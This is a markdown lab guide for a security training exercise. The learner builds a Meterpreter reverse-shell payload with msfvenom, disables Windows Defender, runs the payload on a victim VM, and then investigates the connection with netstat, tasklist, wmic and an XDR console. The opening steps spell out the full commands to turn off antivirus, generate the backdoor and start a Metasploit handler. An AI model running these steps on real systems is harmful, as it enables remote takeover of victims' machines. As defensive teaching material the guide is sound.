# WarmUp

Create a malware with msfvenom, execute it on the victim machine and investigate with built-in win tools
Let's start it.

1. Logint to mrblue PC and open a Terminal as Administrator and select "Yes" at UAC prompt. In the default PowerShell window, run the following command to disable Defender. Remember, our goal here is not bypass endpoint protection.

```PS
Set-MpPreference -DisableRealtimeMonitoring $true
```

2. Check if Defender is really turned off with (should be False):

```PS
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

3. Lofing ro Kali Linux command prompt and check IP address

```bash
ifconfig
```
Mark the IP address of the Kali Linux machine eth0 interface. 

Run the following command to create a simple backdoor.

```bash
sudo su -
```

```bash
msfvenom --platform Windows -a x86 -p windows/meterpreter/reverse_tcp lhost=<YOUR ETH0 IP> lport=4444 -f exe -o /tmp/beliveme.exe
```

```bash
ls -l /tmp/beliveme.exe
```

Copy the malware to the share folder accessible by the Victim machine

```bash
cp /tmp/beliveme.exe /mnt/c/temp
```

```bash
ls -l /mnt/c/temp/
```

Now, we need to start the handler on attacker (Kali) machine. We need one more shell to the Linux box. Select the down carrot from the upper tabs on the Winodws Terminal and select kali-linux

Become a root:

```bash
sudo su -
```

Start the metasploit handler:

$`msfconsole -q`

msf6 > `use exploit/multi/handler`

msf6 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`

msf6 exploit(multi/handler) > `set LHOST <YOUR ETH0 IP>` Your IP will be DIFFERENT

msf6 exploit(multi/handler) > `exploit`

Open a Windows command prompt, by selecting the down carrot from the the Windows Terminal.
Once it's opened, run these commands:

```bash
cd \temp
```

`beliveme.exe`

You should have similar output:

### step 3

Now that we have a backdoor connections, let's investigate it. We know what to look for..this time! :)
Have an administrator terminal session ready and execute the following command:
TIPP1: -b switch needs admin rights and it's very usefull. It shows the executable involved in creating each connections or listening port.

```cmd
netstat -naob
```
![](attachments/warmup_07.png)

TIPP2: You can check the help for netstat (or any other commands) cmd switches

```cmd
netstat /?
```
![](attachments/warmup_08.png)

**TIPP3:** List only the ESTABLISHED connections:
```cmd
netstat -naob | findstr "ESTABLISHED"
```

**TIPP4:** List only the LISTENING connections:
```cmd
netstat -naob | findstr "LISTENING"
```

If you have RDP (or similar) access you can use TCPView application from the SysInternals package

![](attachments/warmup_09.png)

If you look closer, you can find the connection (because we know what to look for) made by our supper evil "beliveme.exe" malware.

![](attachments/warmup_10.png)

List the network connections and look for fully qualified domains. We can get rid of them as very likely they are good ones.

```cmd
netstat -f
```

![](attachments/warmup_11.png)

We can see our connection to the system on port TCP/4444. Lets find the Process ID (PID).
The PID is 5496 (your number will be different!)

```cmd
netstat -naob
```

![](attachments/warmup_12.png)

Dig deeper. Use the "tasklist" command. We can see the loaded DLL's.

```cmd
tasklist /m /fi "pid eq 5496"
```

![](attachments/warmup_13.png)


Check "wmic" to see from where the file was launched. It was launched from the command line as there are no options.

```cmd
wmic process where processid=5496 get commandline
```

![](attachments/warmup_14.png)

We can also find the parent process ID.


```cmd
wmic process get name,parentprocessid,processid | find "5496"
```

![](attachments/warmup_15.png)

```cmd
wmic process get name,parentprocessid,processid | find "1256"
```

![](attachments/warmup_16.png)

### step 4

We can investigate the same with the opensource tools, like SecurityOnion and/or ElasticSearch


### step 5
You can investigate it with a commercial tools as well (e.g. Cisco XDR).
The XDR sees immediately the event and creates an incident.

![](attachments/warmup_30c.png)

Clicking on the incident, we get more details. Like, Vitim endpoint, Local IP, the IP the malware connected to, the file name and the hash of the malware

![](attachments/warmup_31c.png)


The malicious file was automatically sent for dynamic analysis (it's configurable)

![](attachments/warmup_32c.png)


Searching for the hash of the file (beliveme.exe) gives us more tech details. It show immediately , how many endpoints are affected in our organization.
Additionally, the behavior indicators describe, why the file was marked as malicious. 
- Metasploit Payload Detected 
- Artifact flagged as known trojan by Antivirus
- Possible backdoor behavior Detected
- Process uses private IP range for network traffic

![](attachments/warmup_33c.png)

As an analyst/investigator i can:
- Take a forensics snapshot of the memory
- Isolate the endpoint (or snapshot and isolate)
- Move to the Triage group (more logs, strict rules etc.)

![](attachments/warmup_34c.png)

Every stage of the Incident response can logged by the XDR:
- Identification with review, affected hosts, conformation
- Containment with Overview, assets, IPs, domains, URLs, hashes etc
- Eradication with vulnerability remediation, removing malicious content and system restore
- Recovery

![](attachments/warmup_35c.png)

It make sens to collect the netflow (NVZ flow) data at the process level. Not just the SRC/DST IPs and ports are visible, but muc more.
- which process initiated the flow?
- what is the process ID?
- what is the path of the process?
- what is the PID of the parent process?
- what is the parent process name?
- what is the hash of the process?
- How is logged in to the endpoint?
